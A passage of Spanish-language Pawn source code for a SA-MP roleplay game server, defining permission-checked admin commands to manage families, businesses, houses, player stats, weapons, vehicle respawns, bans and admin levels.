				Mensaje(player, COLOR_BLANCO, string);
				
				format(string, sizeof(string), "Usted le asigno la familia ID: %d, al jugador %s", i, PlayerName(player));
				Mensaje(playerid, COLOR_BLANCO, string);
				
				new Consulta[126];
				mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE zz_usuarios SET fam=%d, famr=%d WHERE id = %d;", cuenta[player][cFamilia], cuenta[player][cFamiliaRango], cuenta[player][cUnico]);
				mysql_query(servidor[mysqlControl], Consulta, false);
							
				ActualizarFamilia(i);
				break;
			}
		}
	}else if(!strcmp(opcion, "eliminar")){
		if(player == 1500)return Mensaje(playerid, COLOR_BLANCO, "/setfamilia eliminar (ID de la familia)");
		if(familias[player][fOcupado]){
			familias[player][fOcupado] = 0;
			
			DestroyDynamic3DTextLabel(familias[player][fHqFam3d]);
			DestroyDynamicPickup(familias[player][fHqFampi]);
			
			familias[player][fpospick][0] = 5000.0;
			familias[player][fpospick][1] = 0.0;
			familias[player][fpospick][2] = 0.0;
			
			format(string, sizeof(string), "UPDATE zz_usuarios SET fam=0, famr=0 WHERE fam=%d;", player);
			mysql_query(servidor[mysqlControl], string);
			
			ActualizarFamilia(player);
			
			format(string, sizeof(string), "Usted elimino la familia ID: %d, y todos sus miembros.", player);
			Mensaje(playerid, COLOR_BLANCO, string);

		}else return Mensaje(playerid, COLOR_BLANCO, "Esta familia no existe.");
	}
	return 1;
}
//Administrar Negocios
COMMAND:bizz(playerid, params[]){
	new bizz;
	if(cuenta[playerid][cAdministrador] < 2012)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "i", bizz)){
		Mensaje(playerid, COLOR_GRIS2, "Utiliza: /bizz (llave negocio)");
		MostrarNegocioInfos(playerid);
		return 1;
	}
	if(bizz < 0 || bizz >= MAX_BIZZ)return Mensaje(playerid, COLOR_GRIS2, "ID de negocio erroneo!");
	if(negocio[bizz][bEntrancex] == 4000.0)return Mensaje(playerid, COLOR_GRIS2, "Este negocio no esta agregado!");
	SetPlayerPos(playerid, negocio[bizz][bEntrancex], negocio[bizz][bEntrancey], negocio[bizz][bEntrancez]);
	Mensaje(playerid, COLOR_GRIS2, "Teleportado!");
	return 1;
}
COMMAND:bizzentrada(playerid, params[]){
	new bizz, tipo;
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "dd", tipo, bizz)){
		Mensaje(playerid, COLOR_GRIS2, "Utiliza: /bizzentrada [Tipo][negocioid]");
		Mensaje(playerid, COLOR_GRIS2, "Tipo: 1- Interior Negocio 2- Exterior Negocio");
		MostrarNegocioInfos(playerid);
		return 1;
	}
	if(negocio[bizz][bEntrancex] != 4000.0)return Mensaje(playerid, COLOR_GRIS2, "Usted ya movio este negocio.");

	GetPlayerPos(playerid, negocio[bizz][bEntrancex], negocio[bizz][bEntrancey], negocio[bizz][bEntrancez]);
	if(tipo == 2)GetPlayerPos(playerid, negocio[bizz][bExitx], negocio[bizz][bExity], negocio[bizz][bExitz]);
	
	OnBizzTextdrawUpdate(bizz);
	Mensaje(playerid, COLOR_GRIS2, "Acaba de cambiar la posicion de un negocio.");
	ActualizaNegocio(bizz);
	return 1;
}
COMMAND:avenderauto(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	new vehicleid;
	if(sscanf(params, "d", vehicleid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /avenderauto [Auto ID]");
	if(!EsComprable(vehicleid))return Mensaje(playerid, COLOR_GRIS2, "No puede usar este comando en esta ID.");
	
	VenderAuto(vehicleid);
	Mensaje(playerid, COLOR_ROJO, "Este auto fue vendido.");
	return 1;
}
COMMAND:editarnegocio(playerid, params[])
{
	new bizz, int, Niv, Pre, Float:ipos[3], Nom[32];
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "ddddfffs[32]", bizz, int, Niv, Pre, ipos[0], ipos[1], ipos[2], Nom))
	{
		Mensaje(playerid, COLOR_GRIS2, "Utiliza: /editarnegocio [negocioid][Interior][Nivel][Precio][I_PosX][I_PosY][I_PosZ][Nombre]");
		return 1;
	}
	if(negocio[bizz][bOwned])return Mensaje(playerid, COLOR_GRIS2, "No puedes editar un negocio con dueño.");

	GetPlayerPos(playerid, negocio[bizz][bEntrancex], negocio[bizz][bEntrancey], negocio[bizz][bEntrancez]);

	negocio[bizz][bLevelNeeded] = Niv;
	negocio[bizz][bInt] = int;
	negocio[bizz][bBuyPrice] = Pre;
	
	negocio[bizz][bTime] = 0;
	negocio[bizz][bcostenter] = 0;
	negocio[bizz][bProduc] = 100;
	negocio[bizz][bTill] = 0;
	negocio[bizz][bTillEx] = 0;
	
	negocio[bizz][bExitx] = ipos[0];
	negocio[bizz][bExity] = ipos[1];
	negocio[bizz][bExitz] = ipos[2];
	
	format(negocio[bizz][bOwner], 24, "Sin Propietario");
	negocio[bizz][bName] = Nom;
	format(negocio[bizz][bExtortion], 24, "Sin Extorsionista");
	format(negocio[bizz][bUbicacion], 24, "Asignar");
	format(negocio[bizz][bEmpresa], 24, "Asignar");
	
	OnBizzTextdrawUpdate(bizz);
	ActualizaNegocio(bizz);
	Mensaje(playerid, COLOR_GRIS2, "Usted acaba de crear un nuevo negocio.");
	return 1;
}
COMMAND:removerbizz(playerid, params[]){
	new bizz;
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "i", bizz)){
		Mensaje(playerid, COLOR_GRIS2, "Utiliza: /removerbizz (llave negocio)");
		return 1;
	}
	if(negocio[bizz][bEntrancex] == 4000.0)return Mensaje(playerid, COLOR_GRIS2, "Usted no ha movido este negocio.");

	negocio[bizz][bEntrancex] = 4000.0;
	negocio[bizz][bEntrancey] = 0.0;
	negocio[bizz][bEntrancez] = 0.0;

	OnBizzTextdrawUpdate(bizz);
	Mensaje(playerid, COLOR_GRIS2, "Acaba de cambiar la posicion de un negocio.");
	ActualizaNegocio(bizz);
	return 1;
}
COMMAND:house(playerid, params[]){
	new houseid;
	if(cuenta[playerid][cAdministrador] < 2012)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "i", houseid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /house (id casa)");
	if(0 <= houseid >= MAX_HOUSES)return Mensaje(playerid, COLOR_GRIS2, "ID de casa errónea!");
	SetPlayerPos(playerid, casa[houseid][hEntrancex], casa[houseid][hEntrancey], casa[houseid][hEntrancez]);
	Mensaje(playerid, COLOR_GRIS1, "Teleportado!");
	return 1;
}
COMMAND:houseentrance(playerid, params[]){
	new houseid, string[64];
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "i", houseid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /house (id casa)");
	if(0 <= houseid >= MAX_HOUSES)return Mensaje(playerid, COLOR_GRIS2, "ID de casa errónea!");
	if(casa[houseid][hEntrancex] != 3000.0)return Mensaje(playerid, COLOR_GRIS2, "Esta casa ya fue movida");

	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	format(string, sizeof(string), "Entrada de Casa %d movido a %f - %f - %f", houseid, X, Y, Z);
	Mensaje(playerid, COLOR_AMARILLO3, string);
	casa[houseid][hEntrancex] = X;
	casa[houseid][hEntrancey] = Y;
	casa[houseid][hEntrancez] = Z;
	OnPropTextdrawUpdate(houseid);
	ActualizaCasa(houseid);
	return 1;
}
COMMAND:entradacasa(playerid, params[]){
	new cint;
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "d", cint))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /entradacasa (interior)");
	if(0 <= cint > 10)return Mensaje(playerid, COLOR_GRIS2, "ID de INT erróneo!");

	for(new cid=0;cid<sizeof(casa);cid++){
		if(casa[cid][hEntrancex] == 3000.0){
			GetPlayerPos(playerid, casa[cid][hEntrancex], casa[cid][hEntrancey], casa[cid][hEntrancez]);
			SetearInterior(cid, cint);
			Mensaje(playerid, COLOR_ROJO, "Listo!");
			OnPropTextdrawUpdate(cid);
			ActualizaCasa(cid);
			break;
		}
	}
	return 1;
}
COMMAND:removercasa(playerid, params[]){
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	for(new h=0;h<sizeof(casa);h++){
		if(IsPlayerInRangeOfPoint(playerid, 5.0, casa[h][hEntrancex], casa[h][hEntrancey], casa[h][hEntrancez])){
			casa[h][hEntrancex] = 3000.0;
			casa[h][hEntrancey] = 0;
			casa[h][hEntrancez] = 1000.0;
			OnPropTextdrawUpdate(h);
			Mensaje(playerid, COLOR_VERDE, "Usted removio una casa satisfactoriamente.");
			ActualizaCasa(h);
			break;
		}
	}
	return 1;
}
COMMAND:houseexit(playerid, params[]){
	new houseid, string[64];
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "i", houseid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /houseexit (id casa)");
	if(0 <= houseid >= MAX_HOUSES)return Mensaje(playerid, COLOR_GRIS2, "ID de casa errónea!");
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	format(string, sizeof(string), "Interior de Casa %d puesto en %f - %f - %f", houseid, X, Y, Z);
	Mensaje(playerid, COLOR_AMARILLO3, string);
	casa[houseid][hExitx] = X;
	casa[houseid][hExity] = Y;
	casa[houseid][hExitz] = Z;
	casa[houseid][hInt] = GetPlayerInterior(playerid);
	ActualizaCasa(houseid);
	return 1;
}
COMMAND:verarmas(playerid, params[]){
	new player, string[164], weaponname[32], weacMunicion[13][2];
	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO2, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "u", player))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /verarmas (Jugador)");
	if(!IsPlayerConnected(player))return Mensaje(playerid, COLOR_ROJO, "Jugador no conectado.");

	format(string, sizeof(string), "Armas de: %s[%d]", PlayerName(player), player);
	Mensaje(playerid, COLOR_GRIS1, string);

	for(new i=0;i<=12;i++)
	{
		GetPlayerWeaponData(player, i, weacMunicion[i][0], weacMunicion[i][1]);
		if(weacMunicion[i][0] != 0)
		{
			GetWeaponName(weacMunicion[i][0], weaponname, sizeof(weaponname));
			format(string, sizeof(string), "Arma: %s - balas: %d", weaponname, weacMunicion[i][1]);
			Mensaje(playerid, COLOR_GRIS2, string);
		}
	}
	
	for(new x=0;x<6;x++)
	{
		if(!inventario[player][invArmas][x]) continue;
		format(string, sizeof(string), "Arma: %s - balas: %d", inventario[player][invArmas][x], inventario[player][invBalas][x]);
		Mensaje(playerid, COLOR_GRIS2, string);
	}
	return 1;
}
COMMAND:desarmar(playerid, params[]){
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO2, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "u", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /desarmar (Jugador)");
	if(params[0] != INVALID_PLAYER_ID){
		new string[128];
		format(string, sizeof(string), "%s desarmó a %s", PlayerName(playerid), PlayerName(params[0]));
		AdminMensaje(string);
		quitarArmas(params[0]);
		for(new x=0;x<6;x++)
		{
			inventario[params[0]][invArmas][x] = 0;
			inventario[params[0]][invBalas][x] = 0;
		}
	}else Mensaje(playerid, COLOR_GRIS2, "ID Inválida!");
	return 1;
}
COMMAND:setstat(playerid, params[])
{
	new Jugador, Codigo, Cantidad, string[128];
	if(IsPlayerConnected(playerid))
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		if(cuenta[playerid][cAdministrador] >= 2013)
		{
			if(!sscanf(params, "uii", Jugador, Codigo, Cantidad))
			{
				if(IsPlayerConnected(Jugador))
				{
					if(Jugador != INVALID_PLAYER_ID)
					{
						switch(Codigo)
						{
							case 1:
							{
								cuenta[Jugador][cNivel] = Cantidad;
								UpdatePlayerStat(Jugador);
								format(string, sizeof(string), "Admin %s ha establecido nivel %d a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 2:
							{
								cuenta[Jugador][cDineroBanco] = Cantidad;
								if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
								format(string, sizeof(string), "Admin %s ha establecido %d$ en la cuenta bancaria de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 3:
							{
								cuenta[Jugador][cTelefono] = Cantidad;
								format(string, sizeof(string), "Teléfono: #%d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
							}
							case 4:
							{
								cuenta[Jugador][cExperiencia] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d los puntos de respeto de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 5:
							{
								cuenta[Jugador][cCaminar] = Cantidad;
								format(string, sizeof(string), "Estilo andar: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
								SetPlayerWalkingStyle(Jugador, cuenta[Jugador][cCaminar]);
							}
							case 6:
							{
								cuenta[Jugador][cCasa] = Cantidad;
								format(string, sizeof(string), "Casa: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
							}
							case 7:
							{
								cuenta[Jugador][cTrabajo] = Cantidad;
								UpdatePlayerStat(Jugador);
								format(string, sizeof(string), "Trabajo: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
							}
							case 8:
							{
								switch(Cantidad)
								{
									case 0:
									{
										cuenta[Jugador][cCoche] = 0;
										Mensaje(playerid, COLOR_GRIS2, "Vehículo: 0");
									}
									default:
									{
										cuenta[Jugador][cCoche] = Cantidad;
										format(string, sizeof(string), "Vehículo: %d", Cantidad);
										Mensaje(playerid, COLOR_GRIS2, string);
									}
								}
							}
							case 9:
							{
								switch(Cantidad)
								{
									case 0:
									{
										cuenta[Jugador][cCoche2] = 0;
										Mensaje(playerid, COLOR_GRIS2, "Vehículo 2: 0");
									}
									default:
									{
										cuenta[Jugador][cCoche2] = Cantidad;
										format(string, sizeof(string), "Vehículo 2: %d", Cantidad);
										Mensaje(playerid, COLOR_GRIS2, string);
						    		}
				    			}
							}
							case 10:
							{
								switch(Cantidad)
								{
									case 0:
									{
										cuenta[Jugador][cCoche3] = 0;
										Mensaje(playerid, COLOR_GRIS2, "Vehículo 3: 0");
									}
									default:
									{
										cuenta[Jugador][cCoche3] = Cantidad;
										format(string, sizeof(string), "Vehículo 3: %d", Cantidad);
										Mensaje(playerid, COLOR_GRIS2, string);
									}
								}
							}
							case 11:
							{
								cuenta[Jugador][cEdad] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d la edad de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 12:
							{
								cuenta[Jugador][cDesert] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d el nivel de Deagle de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
								SetPlayerStats(Jugador);
							}
							case 13:
							{
								cuenta[Jugador][cEscopeta] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d el nivel de Shotgun de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
								SetPlayerStats(Jugador);
							}
							case 14:
							{
								cuenta[Jugador][cMP5] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d el nivel de MP5 de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
								SetPlayerStats(Jugador);
							}
							case 15:
							{
								cuenta[Jugador][cAK47] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d el nivel de AK47 de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
								SetPlayerStats(Jugador);
							}
							case 16:
							{
								cuenta[Jugador][cM4] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d el nivel de M4 de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
								SetPlayerStats(Jugador);
							}
							case 17:
							{
								cuenta[Jugador][cSniper] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d el nivel de Sniper de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
								SetPlayerStats(Jugador);
							}
							case 18:
							{
								cuenta[Jugador][cSexo] = Cantidad;
								format(string, sizeof(string), "Sexo: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
								UpdatePlayerStat(playerid);
				    		}
							case 19:
							{
							}
							case 20:
							{
								cuenta[playerid][cRentado] = Cantidad;
								format(string, sizeof(string), "Renta: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
							}
							case 21:
							{
								cuenta[Jugador][cEstiloPelea] = Cantidad;
								format(string, sizeof(string), "Tipo Lucha: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
							}
							case 22:
							{
								cuenta[Jugador][cMateriales] = Cantidad;
								format(string, sizeof(string), "Admin %s ha dado %d materiales a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 23:
							{
								cuenta[Jugador][cDrogas] = Cantidad;
								format(string, sizeof(string), "Admin %s ha dado %d gramos de drogas a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 24:
							{
								cuenta[Jugador][cSpeed] = Cantidad;
								format(string, sizeof(string), "Admin %s ha dado %d gramos de speed a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 25:
							{
								cuenta[Jugador][cExtasis] = Cantidad;
								format(string, sizeof(string), "Admin %s ha dado %d gramos de estasis a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 26:
							{
								cuenta[Jugador][cRitalin] = Cantidad;
								format(string, sizeof(string), "Admin %s ha dado %d gramos de ritalin a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 27:
							{
								cuenta[Jugador][cHeroina] = Cantidad;
								format(string, sizeof(string), "Admin %s ha dado %d gramos de heroina a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 28:
							{
								cuenta[Jugador][cMarihuana] = Cantidad;
								format(string, sizeof(string), "Admin %s ha dado %d gramos de marihuana a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 29:
							{
								cuenta[Jugador][cAdvertencias] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido en %d las advertencias de %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 30:
							{
								if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
								cuenta[Jugador][cNegocio] = Cantidad;
								format(string, sizeof(string), "Negocio: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
							}
							case 31:
							{
								if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
								cuenta[Jugador][cNegocio2] = Cantidad;
								format(string, sizeof(string), "Negocio 2: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
							}
							case 32:
							{
								switch(Cantidad)
								{
									case 0:
									{
										cuenta[Jugador][cCoche4] = 0;
										Mensaje(playerid, COLOR_GRIS2, "Vehículo 4: 0");
									}
									default:
									{
										cuenta[Jugador][cCoche4] = Cantidad;
										format(string, sizeof(string), "Vehículo 4: %d", Cantidad);
										Mensaje(playerid, COLOR_GRIS2, string);
									}
								}
							}
							case 33:
							{
								cuenta[Jugador][cTarjeta] = Cantidad;
								format(string, sizeof(string), "Admin %s ha establecido la tarjeta de credito %d a %s", PlayerName(playerid), Cantidad, PlayerName(Jugador));
								AdminMensaje(string);
							}
							case 34:
							{
								cuenta[Jugador][cOrigen] = Cantidad;
								format(string, sizeof(string), "Nacionalidad: %d", Cantidad);
								Mensaje(playerid, COLOR_GRIS2, string);
								UpdatePlayerStat(playerid);
							}
							default: Mensaje(playerid, COLOR_GRIS2, "Código inválido!");
						}
					}
				}else Mensaje(playerid, COLOR_GRIS2, "ID Inválida!");
			}else{
				Mensaje(playerid, COLOR_GRIS1, "Utiliza: /setstat <PlayerID> <código> <x>");
				Mensaje(playerid, COLOR_GRAD4, "|1.Nivel - 2.Cuenta Bancaria - 3.Teléfono - 4.PuntosRespeto 5.Estilo");
				Mensaje(playerid, COLOR_GRAD4, "|6.Casa - 7.Trabajo - 8.Vehículo - 9. Vehículo2 - 10.AutoPremium - 11.Edad");
				Mensaje(playerid, COLOR_GRAD4, "|12.Deagle - 13.Shotgun - 14.MP5 - 15.ak47 - 16.M4 - 17.Sniper - 18.Sexo");
				Mensaje(playerid, COLOR_GRAD4, "|19.Drunk - 20.Rent - 21.Lucha - 22.Materiales - 23.Drogas - 24.Speed - 25.Extasis");
				Mensaje(playerid, COLOR_GRAD4, "|26.Ritalin - 27.Heroina - 28.Marihuana - 29.Advertencias - 30.Negocio - 31.Negocio2");
				Mensaje(playerid, COLOR_GRAD4, "|32.Autopremium2 - 33. Tarjeta - 34.Nacionalidad");
				return Mensaje(playerid, COLOR_GRAD4, "|33. Nacionalidad");
			}
		}else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	}
	return 1;
}

COMMAND:rsrenta(playerid)
{
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	//
	if(servidor[tiempoUso][2] > gettime())
	{
		new tmp[86];
		format(tmp, sizeof(tmp), "Este comando no puede ser usado, espere %s.", ObtenerTiempoRestante(servidor[tiempoUso][2]));
		Mensaje(playerid, COLOR_ROJO, tmp);
		return 1;
	}
	servidor[tiempoUso][2] = gettime() + 3600;
	//
	respawnAutos20s(playerid, 2);
	return 1;
}
COMMAND:rsjobs(playerid)
{
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	//
	if(servidor[tiempoUso][1] > gettime())
	{
		new tmp[86];
		format(tmp, sizeof(tmp), "Este comando no puede ser usado, espere %s.", ObtenerTiempoRestante(servidor[tiempoUso][1]));
		Mensaje(playerid, COLOR_ROJO, tmp);
		return 1;
	}
	servidor[tiempoUso][1] = gettime() + 3600;
	//
	respawnAutos20s(playerid, 1);
	return 1;
}

COMMAND:rsfacciones(playerid)
{
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	//
	if(servidor[tiempoUso][0] > gettime())
	{
		new tmp[86];
		format(tmp, sizeof(tmp), "Este comando no puede ser usado, espere %s.", ObtenerTiempoRestante(servidor[tiempoUso][0]));
		Mensaje(playerid, COLOR_ROJO, tmp);
		return 1;
	}
	servidor[tiempoUso][0] = gettime() + 3600;
	//
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(cuenta[i][cMiembro])
		{
			Mensaje(playerid, COLOR_AMARILLO2, "Los autos de facciones sin uso seran Spawneados en 20 segundos.");
		}
	}
	SetTimerEx("respawnAutos20s", 20000, false, "dd", playerid, 0);
	return 1;
}
/*
 *	Comandos Administrativos Modificados
 *
 *	31/07/2015 - 03:03 a.m.
 *	Hora Venezolana.
 *
*/
COMMAND:unban(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] >= 4)
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		new Cache:R, tmp[136], tmp2[32], tmp3[32];
		if(sscanf(params, "s[32]", tmp2))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /unban [Usuario o IP]");
		
		mysql_real_escape_string(tmp2, tmp3, servidor[mysqlControl]);
		mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT * FROM zz_tablaip WHERE ipaddress='%e' OR nombre='%e' LIMIT 1;", tmp3, tmp3);
		R = mysql_query(servidor[mysqlControl], tmp, true);
		
		if(cache_get_row_count())
		{
			mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "DELETE FROM zz_tablaip WHERE ipaddress='%e' OR nombre='%e';", tmp3, tmp3);
			mysql_query(servidor[mysqlControl], tmp, false);
			
			format(tmp, sizeof(tmp), "El administrador %s desbaneo al Usuario/IP %s del servidor.", Nombre(playerid), tmp3);
			MensajeAdmin(0xFF9562FF, tmp, 1);
		} 
		else
		{
			Mensaje(playerid, COLOR_ROJO, "No se encontro Usuario/IP intente nuevamente!");
		}
		cache_delete(R);
	}else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	return 1;
}
COMMAND:descongelartodos(playerid)
{
	if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	for(new x=0, y=GetMaxPlayers();x<y;x++)
	{
		if(IsPlayerConnected(x)) TogglePlayerControllable(x, true);
	}
	new tmp[76];
	format(tmp, sizeof(tmp), "El administrador %s descongelo a todos los jugadores.", PlayerName(playerid));
	MensajeAdmin(0xFF9562FF, tmp, 1);
	return 1;
}
COMMAND:listaspec(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 2013) return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	new tmp[66], tmp2[66 * 50];
	strcat(tmp2, "\n");
	for(new x, y=GetMaxPlayers();x<y;x++)
	{
		if(entero[x][gSpectea] != INVALID_PLAYER_ID && IsPlayerConnected(x))
		{
			format(tmp, sizeof(tmp), "{ffffff}%s spect a %s\n", Nombre(x), Nombre(entero[x][gSpectea]));
			strcat(tmp2, tmp);
		}
	}
	strcat(tmp2, "\n");
	ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Lista de Specteos", tmp2, "Aceptar", "");
	return 1;
}
COMMAND:daradmin(playerid, params[])
{
	new jugador, nivel, string[144];
	if(cuenta[playerid][cAdministrador] < 2013) return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "ui", jugador, nivel))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /daradmin <ID> <Nivel>");
	
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado utiliza: /staff");
	if(cuenta[playerid][cAdministrador] == 2013 && cuenta[jugador][cAdministrador] == 2014)
	{
		format(string, sizeof(string), "ATENCIÓN: %s intentó modificar el admin a %s", PlayerName(playerid), PlayerName(jugador));
		AdminMensaje(string);
		return 1;
	}
	else if(cuenta[playerid][cAdministrador] == 2013 && nivel > 2012)
	{
		Mensaje(playerid, COLOR_ROJO, "No tienes permisos para dar estos niveles");
		return 1;
	}
	
	cuenta[jugador][cAdministrador] = nivel;	    
	if(!nivel)
